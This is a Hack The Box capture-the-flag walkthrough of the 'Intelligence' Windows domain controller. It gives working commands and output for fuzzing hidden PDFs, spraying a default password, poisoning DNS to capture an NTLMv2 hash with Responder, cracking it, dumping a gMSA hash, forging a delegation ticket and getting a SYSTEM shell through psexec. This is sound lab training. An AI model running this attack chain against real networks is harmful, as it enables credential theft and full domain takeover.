---
layout: post
author: jseals
title: "Intelligence: Hack The Box Walk-through"
image: htb-intelligence/intelligence.png
---

## Background

Intelligence is a "vulnerable by design" machine created by [Micah][1] and hosted at [hackthebox.eu][2]. In this walk-through I perform the actions of an attacker. The goals are to get user-level privileges on the victim machine (get the flag in /home/$USER/user.txt) and escalate privileges to root (get the flag in /root/root.txt).

## Victim Machine Specs

![intelligence.png](/assets/images/posts/htb-intelligence/intelligence.png)

## Reconnaissance

Start it off with a Nmap scan:
```text
# Nmap 7.92 scan initiated Mon Nov  1 22:58:19 2021 as: nmap -sV -sC -oA nmap/intelligence -v intelligence.htb
Nmap scan report for intelligence.htb (10.129.247.213)
Host is up (0.056s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021; +6h59m44s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021; +6h59m44s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021; +6h59m44s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021; +6h59m44s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m43s, deviation: 0s, median: 6h59m43s
| smb2-time: 
|   date: 2021
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  1 22:59:51 2021 -- 1 IP address (1 host up) scanned in 92.27 seconds
```

We confirm it's a Windows box and possibly an AD server since it's serving LDAP, DNS, etc.

## Enumeration

Let's start the enumeration with a directory search on the web server with gobuster:
```text
[/home/gn0stic/htb/intelligence] λ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://intelligence.htb
```

Here's what the homepage of the website looks like:
![homepage.png](/assets/images/posts/htb-intelligence/homepage.png)

Looking at the source of the website and the gobuster output (sorry, gobuster output must not have been copied in my notes) we see a documents directory which we can't access directly, but two pdfs can be downloaded from the website and they're stored in that documents directory.

The PDFs just contain lorem ipsum text, nothing of interest on the surface.

Looking at the PDF files, I noticed there was a name in the form of first.last as the value of a creator field in the PDF metadata. I also thought maybe there were more PDFs in the document directory. Below are the hacky commands used to download all the documents using the y-m-d-upload.pdf naming convention.

Create month values:
```text
>>> for x in range(1, 13):
...   print("%02d" % (x,))
```

Create day values:
```text
>>> for x in range(1, 31):
...   print("%02d" % (x,))
```

I Used these together with the ffuf fuzzing tool to loop through and create an json output file of all the URLs found with a 200 response code.  Example of ffufz for the month of december:
```text
ffuf -w /usr/share/seclists/Fuzzing/calendar-days.txt -u http://intelligence.htb/documents/2020-12-FUZZ-upload.pdf -c -v -o fuzz-pdfs/12.log
```

We can then loop through and parse out the URL only with something like this:

```text
jq -r '.results[].url' ffuf-output.json
```

I then looped through that with wget to download all the pdfs, we got 84 in total using this method:

![downloaded-pdfs.png](/assets/images/posts/htb-intelligence/downloaded-pdfs.png)

Next, we pull out the Creator metadata field and use sed to remove the nonsense:
```text
$ strings * |grep -v TeX |grep Creator > user-names.log
$ sed -i 's/\/Creator (//g' user-names.log
$ sed -i 's/)//g' user-names.log
```

Finally, sort and unique the file for a final list of potential users:
```text
sort -u user-names.log > unique-user-names.log
```

We're left with this nice list of usernames:
![retrieved-usernames.png](/assets/images/posts/htb-intelligence/retrieved-usernames.png)

We have usernames but no passwords... Did a little looking around and learned how to do the pitchfork mode with ffuf, supplying two wordlists, one for each fuzzed parameter in the URL respectively. Much easier and cleaner than looping with bash. I ran this for the year 2021.
```text
[/home/gn0stic/htb/intelligence/fuzz-pdfs/2021-pdfs] λ ffuf -w /usr/share/seclists/Fuzzing/month-ints.txt:MFUZZ -w /usr/share/seclists/Fuzzing/calendar-day-ints.txt:DFUZZ -u http://intelligence.htb/documents/2021-MFUZZ-DFUZZ-upload.pdf -c -v         
```

This got me 17 pdfs for 2021 using the same month-day-upload.pdf format. I parsed the URLs out with jq, and again used wget to get all the PDFs.

## Foothold
I wasn't getting much with running strings on the PDFs, but PDF streams can include text that doesn't show with strings, so I ran a search into the text streams of the PDFs and grepped for "pass", we got a hit:
```text
[/home/gn0stic/htb/intelligence/fuzz-pdfs/2020-pdfs] λ for x in $(ls *.pdf); do echo $x; pdf2txt.py $x |grep -i pass; done;

---cut some output---
2020-06-04-upload.pdf
Please login using your username and the default password of:
After logging in please change your password as soon as possible.
```

Looks interesting, let's remove the grep and look at all of the text streams for this pdf:
```text
[/home/gn0stic/htb/intelligence/fuzz-pdfs/2020-pdfs] λ pdf2txt.py 2020-06-04-upload.pdf
New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.
```

So now we have usernames and a potential password, let's hope we have some lazy users or users who haven't logged in to change the password yet.

Let's use crackmapexec to see if we can use our new password and the users we got, we'll start by seeing if anyone has access to any shares:
```text
[intelligence] λ crackmapexec smb intelligence.htb -u users.out -p NewIntelligenceCorpUser9876 --shares

----cut failed logon output----

SMB         10.129.248.252  445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.248.252  445    DC               [+] Enumerated shares
SMB         10.129.248.252  445    DC               Share           Permissions     Remark
SMB         10.129.248.252  445    DC               -----           -----------     ------
SMB         10.129.248.252  445    DC               ADMIN$                          Remote Admin
SMB         10.129.248.252  445    DC               C$                              Default share
SMB         10.129.248.252  445    DC               IPC$            READ            Remote IPC
SMB         10.129.248.252  445    DC               IT              READ            
SMB         10.129.248.252  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.248.252  445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.248.252  445    DC               Users           READ         
```

The user "Tiffany.Molina" gets a hit, looks like she has read access to 5 of the 7 shares found. Let's start by listing out what's in the IT share:
```text
[intelligence] λ smbmap -H 10.129.248.252 -d intelligence.htb -r IT -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[+] IP: 10.129.248.252:445	Name: intelligence.htb                                  
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	IT                                                	READ ONLY	
	.\IT\*
	dr--r--r--                0 Sun Apr 18 19:50:58 2021	.
	dr--r--r--                0 Sun Apr 18 19:50:58 2021	..
	fr--r--r--             1046 Sun Apr 18 19:50:58 2021	downdetector.ps1
```

Let's download the powershell script we found:
```text
[intelligence] λ smbmap -H 10.129.248.252 -d intelligence.htb -R IT -A downdetector.ps1 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[+] IP: 10.129.248.252:445	Name: intelligence.htb                                  
[+] Starting search for files matching 'downdetector.ps1' on share IT.
[+] Match found! Downloading: IT\downdetector.ps1
```

What's in the script?
```text
[intelligence] λ cat 10.129.248.252-IT_downdetector.ps1
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Looks like it iterates over the DNS records that start with web, trys an http request to that record, and if the http response code is not 200, it sends an e-mail to Ted Graves / Ted.Graves saying the host or A record is down or not reachable.

A couple things stick out, the comment at the top stating this runs every 5 minutes, in these htb challenges, this often means a way to root or something we can potentially abuse. Second, we have a new user that wasn't in our list before. We need to add him to our users list and recheck our smb tests.


## User
Now, what's in the Users share?
```text
[intelligence] λ smbmap -H 10.129.248.252 -d intelligence.htb -r Users -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[+] IP: 10.129.248.252:445	Name: intelligence.htb                                  
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Users                                             	READ ONLY	
	.\Users\*
	dw--w--w--                0 Sun Apr 18 20:20:26 2021	.
	dw--w--w--                0 Sun Apr 18 20:20:26 2021	..
	dr--r--r--                0 Sun Apr 18 19:18:39 2021	Administrator
	dr--r--r--                0 Sun Apr 18 22:16:30 2021	All Users
	dw--w--w--                0 Sun Apr 18 21:17:40 2021	Default
	dr--r--r--                0 Sun Apr 18 22:16:30 2021	Default User
	fr--r--r--              174 Sun Apr 18 22:15:17 2021	desktop.ini
	dw--w--w--                0 Sun Apr 18 19:18:39 2021	Public
	dr--r--r--                0 Sun Apr 18 20:20:26 2021	Ted.Graves
	dr--r--r--                0 Sun Apr 18 19:51:46 2021	Tiffany.Molina
```

Looks like it's the actualy Users directory on the system, we have the user flag using this method:
```text
[intelligence] λ smbmap -H 10.129.248.252 -d intelligence.htb -R Users -A user.txt -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[+] IP: 10.129.248.252:445	Name: intelligence.htb                                  
[+] Starting search for files matching 'user.txt' on share Users.
[+] Match found! Downloading: Users\Tiffany.Molina\Desktop\user.txt
[intelligence] λ cat 10.129.248.252-Users_Tiffany.Molina_Desktop_user.txt
3cd198c1db41468bd8--truncated--
```

## Root

I did quite a lot of LDAP enumeration since I now had working credentials and got information on users, groups, etc. However, nothing was leading me to more information about Ted except that he was in the IT group.

I started to look for ways to add DNS entries remotely, I started my search by googling around for impacket related scripts since that tends to be the goto framework for AD interactions of all kinds. I didn't find much on the impacket github, but this repo showed up in my results as well:

https://github.com/dirkjanm/krbrelayx

This contains a python script called 'dnstool.py'. Looking through it, it uses the ldap3 module and impacket to remotely add a DNS record which is just what we need to activate that powershell script we found earlier.

I used the credentials for Tiffany and added an A record that started with "web" since the powershell script we found only checked for records starting with web*.  The value / IP of the record is my htb vpn IP.
```text
[krbrelayx(master)] λ python3 ./dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webgn0stic -d 10.10.14.68 intelligence.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/home/gn0stic/code/github.com/krbrelayx/./dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```

What I'm assuming is that every 5 minutes, there is a script that Ted is running that will check these A records that get e-mailed to him from the powershell script. In that case, we start up a responder listener and after a few minutes, we get Ted's hash:
```text
[krbrelayx(master)] λ sudo responder -I tun0  -v
[sudo] password for gn0stic: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.7.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

----cut out responder output----

[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.129.248.252
[HTTP] GET request from: 10.129.248.252   URL: / 
[HTTP] Host             : webgn0stic 
[HTTP] NTLMv2 Client   : 10.129.248.252
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:16feb6a8f2b2bcf1:AB84615DAB46E9193E00E39948C1C998:0101000000000000E055A7F17BD1D7014608465278619AD8000000000200080059004C0052004F0001001E00570049004E002D003100530036003300560045003200430030005A0034000400140059004C0052004F002E004C004F00430041004C0003003400570049004E002D003100530036003300560045003200430030005A0034002E0059004C0052004F002E004C004F00430041004C000500140059004C0052004F002E004C004F00430041004C000800300030000000000000000000000000200000BE06E7A9EBD48DB52661E7F1489894A1EAC5ABF2E6FE41378FC50D1A16555B6D0A001000000000000000000000000000000000000900400048005400540050002F0077006500620067006E00300073007400690063002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Great, we should be able to authenticate as Ted now. We can retry our commands and see if he has more access since he's in IT. Let's see if john can crack the hash with the rockyou list:

```text
[intelligence] λ john --wordlist=/usr/share/wordlists/rockyou.txt ted.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:08 DONE (2021) 0.1168g/s 1263Kp/s 1263Kc/s 1263KC/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Yup, no problem. We see "Mr.Teddy" is his password.

Reading through hacktricks, I saw this entry:
https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#group-managed-service-accounts-gmsa

Talking about gmsa. Looks interesting and I see the box seems to have one such account. I found this by first dumping the ldap info as Teddy:
```text
[teddy-domain-dump] λ ldapdomaindump -r intelligence.htb -u 'intelligence.htb\Ted.Graves' -p 'Mr.Teddy'
```

grepping for msds on the json files that were output shows me a "svc_int" manged service account:
```text
    "dn": "CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb"
```

This post explains how to dump the encrypted blob
https://cube0x0.github.io/Relaying-for-gMSA/

I tried to use ntlmrelayx.py to dump the blob, but I must be using it wrong. The 5 minute cron job caused Ted to read my e-mail and access my web server that ntlmrelayx created, but it kept failing:
```text
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 10.129.248.252, attacking target ldaps://intelligence.htb
[*] HTTPD: Client requested path: /
[*] HTTPD: Received connection from 10.129.248.252, attacking target ldaps://intelligence.htb
[*] HTTPD: Client requested path: /
[*] HTTPD: Client requested path: /
[-] Authenticating against ldaps://intelligence.htb as intelligence\Ted.Graves FAILED
[*] HTTPD: Client requested path: /uixa5y7sth
```

After some more searching, I found another tool:
https://github.com/micahvandeusen/gMSADumper

It works right away and doesn't require any listeners or waiting for Ted to connect.
```text
[gMSADumper(main)] λ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c699eaac79b69357d9dabee3379547e6
```

```text
[intelligence] λ cat domain-dump/*.json |grep -A 1 msDS-AllowedToDelegateTo
        "msDS-AllowedToDelegateTo": [
            "WWW/dc.intelligence.htb"
```

We have enough to try the Silver Ticket attack:
```text
[ldap(master)] λ impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :c699eaac79b69357d9dabee3379547e6 -impersonate Adminstrator
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Kerberos is picky with clock skews, so let's fix the that:
```text
[ldap(master)] λ sudo ntpdate intelligence.htb
 4 Nov 10:01:42 ntpdate[51145]: step time server 10.129.248.252 offset +25181.840344 sec
[ldap(master)] λ datetime
```

Generate the silver ticket:
```text
[ldap(master)] λ impacket-getST intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :c699eaac79b69357d9dabee3379547e6 -impersonate Administrator
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Set the ticket's path to the KRB5CCNAME env variable value:
```text
[intelligence] λ export KRB5CCNAME=./Administrator.ccache
```

Finally, use psexec to get a cmd prompt as Administrator and get the root flag:
```text
[intelligence] λ impacket-psexec intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file xpAOeSsS.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service gCDf on dc.intelligence.htb.....
[*] Starting service gCDf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
1367d648cf64c3f2--truncated--
```


[1]: https://app.hackthebox.com/users/22435
[2]: https://www.hackthebox.eu